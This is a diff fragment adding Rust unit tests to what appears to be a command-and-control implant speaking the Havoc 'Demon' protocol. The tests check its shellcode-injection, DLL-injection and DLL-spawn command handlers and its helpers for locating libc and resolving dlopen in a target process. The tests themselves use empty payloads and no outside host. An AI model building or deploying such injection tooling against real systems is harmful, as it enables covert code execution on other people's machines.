+        let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 0x60, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandSpawnDll));
+        let mut offset = 0;
+        let status = read_u32(payload, &mut offset);
+        assert_eq!(status, super::INJECT_ERROR_FAILED);
+    }
+
+    /// Verify that all three injection response payloads are exactly 4 bytes
+    /// (a single u32 status), matching the Demon protocol.
+    #[tokio::test]
+    async fn injection_response_payload_is_4_bytes() {
+        let mut state = PhantomState::default();
+
+        // Inject shellcode with empty payload (will fail, but response format is what matters).
+        let sc_payload =
+            build_inject_shellcode_payload(super::INJECT_WAY_EXECUTE, 0, 1, &[], &[], 0);
+        execute(
+            &DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, sc_payload),
+            &mut state,
+        )
+        .await
+        .expect("execute shellcode");
+
+        // Inject DLL with empty payload.
+        let dll_payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
+        execute(&DemonPackage::new(DemonCommand::CommandInjectDll, 2, dll_payload), &mut state)
+            .await
+            .expect("execute dll");
+
+        // Spawn DLL with empty payload.
+        let spawn_payload = build_spawn_dll_payload(&[], &[], &[]);
+        execute(&DemonPackage::new(DemonCommand::CommandSpawnDll, 3, spawn_payload), &mut state)
+            .await
+            .expect("execute spawn dll");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 3);
+        for cb in &callbacks {
+            let PendingCallback::Structured { payload, .. } = cb else {
+                panic!("expected Structured callback");
+            };
+            assert_eq!(payload.len(), 4, "injection response must be exactly 4 bytes (u32 status)");
+        }
+    }
+
+    /// Verify that `find_libc_base` returns a valid address for our own process.
+    #[test]
+    fn find_libc_base_returns_valid_address() {
+        let pid = std::process::id();
+        let base = super::find_libc_base(pid);
+        assert!(base.is_some(), "should find libc in own process");
+        assert!(base.expect("checked") > 0);
+    }
+
+    /// Verify that `resolve_dlopen_in_target` returns an address for our own libc.
+    #[test]
+    fn resolve_dlopen_returns_valid_address() {
+        let pid = std::process::id();
+        let libc_base = super::find_libc_base(pid).expect("find libc base");
+        let addr = super::resolve_dlopen_in_target(libc_base);
+        assert!(addr.is_some(), "should resolve dlopen in own process");
+        assert!(addr.expect("checked") > libc_base, "dlopen should be past libc base");
     }
 }
